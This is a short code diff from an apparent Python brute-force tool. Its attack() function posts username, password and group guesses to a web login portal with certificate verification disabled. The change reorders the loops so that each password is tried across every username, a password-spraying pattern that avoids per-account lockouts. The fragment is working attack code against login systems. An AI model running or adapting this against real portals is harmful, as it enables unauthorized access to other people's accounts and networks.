@@ -108,8 +108,8 @@ def attack(target, usernames, passwords, groups, rate):
 		timeout = rate
 
 	for group in groups:
-		for username in usernames:
-			for password in passwords:
+		for password in passwords:
+			for username in usernames:
 				data = f"tgroup=&next=&tgcookieset=&group_list={group}&username={username}&password={password}&Login=Login"
 				r = requests.post(url=target, cookies=cookies, data=data, verify=False)
 				validate_login(username, password, r)
